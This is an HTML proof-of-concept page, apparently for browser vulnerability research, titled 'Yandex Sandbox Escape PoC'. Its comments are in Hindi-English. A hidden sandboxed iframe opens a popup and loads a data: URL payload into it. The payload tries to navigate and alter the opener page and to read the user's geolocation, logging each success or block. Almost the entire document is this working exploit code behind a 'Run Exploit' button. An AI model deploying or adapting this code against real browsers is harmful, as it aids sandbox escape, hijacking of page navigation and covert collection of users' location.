<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Yandex Sandbox Escape PoC</title>
<style>
body { font-family: sans-serif; padding: 16px; }
.log { background: #111; color: #0f0; padding: 10px; font-family: monospace; border-radius: 8px; white-space: pre-wrap; }
button { padding: 8px 14px; border-radius: 6px; }
</style>
</head>
<body>
<h1>Yandex Sandbox Escape PoC</h1>
<p>Test karein: Sandboxed iframe se unsandboxed tab khul sakta hai ya nahi.</p>

<button id="start">Run Exploit</button>

<h3>Logs:</h3>
<div id="log" class="log"></div>

<!-- Sandboxed iframe -->
<iframe id="sbx" sandbox="allow-scripts allow-popups" style="width:1px;height:1px;opacity:0;border:0;"
srcdoc="
<!DOCTYPE html>
<html>
<body>
<script>
function log(x){ parent.postMessage({type:'log', msg:x}, '*'); }

// Test function: popup open karke payload inject karna
function runTest(){
    log('Iframe: Opening about:blank popup...');
    var w = window.open('about:blank', '_blank');
    if(!w){ log('Iframe: Popup blocked ya sandbox ne roka'); return; }

    log('Iframe: Popup opened, injecting payload...');
    var payload = \`<!DOCTYPE html><html><body>
        <h2>Aux Window</h2>
        <div id=out></div>
        <script>
        function p(m){
            document.getElementById('out').innerHTML += m+'<br>';
            try{ opener.postMessage({type:'fromAux', msg:m}, '*'); }catch(e){}
        }
        p('Opener access: '+(!!window.opener));
        try{ opener.location.hash = '#changed'; p('Opener hash change SUCCESS'); }catch(e){ p('Opener hash change BLOCKED: '+e); }
        try{ opener.location = 'https://example.com/#nav'; p('Opener nav attempt SUCCESS'); }catch(e){ p('Opener nav BLOCKED: '+e); }
        try{ if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(
                pos => p('Geolocation: '+pos.coords.latitude+','+pos.coords.longitude),
                err => p('Geo err: '+err.message)
            );
        }}catch(e){ p('Geo API blocked: '+e); }
        <\/script>
    </body></html>\`;
    w.location = 'data:text/html,' + encodeURIComponent(payload);
}

// Parent se messages suno
window.addEventListener('message', e=>{
    if(e.data && e.data.type==='GO'){ runTest(); }
});

// Parent ko batana ki iframe ready hai
parent.postMessage({type:'ready'}, '*');
<\/script>
</body>
</html>
"></iframe>

<script>
const logEl = document.getElementById('log');
function log(m){ logEl.textContent += m + '\n'; }

// Messages handle karna
window.addEventListener('message', e=>{
    if(e.data.type==='log') log('[IFRAME] ' + e.data.msg);
    if(e.data.type==='fromAux') log('[AUX] ' + e.data.msg);
    if(e.data.type==='ready') log('Iframe ready. Click Run Exploit.');
});

// Button click par iframe ko GO message bhejna
document.getElementById('start').addEventListener('click', ()=>{
    const iframe = document.getElementById('sbx');
    iframe.contentWindow.postMessage({type:'GO'}, '*');
});
</script>
</body>
</html>
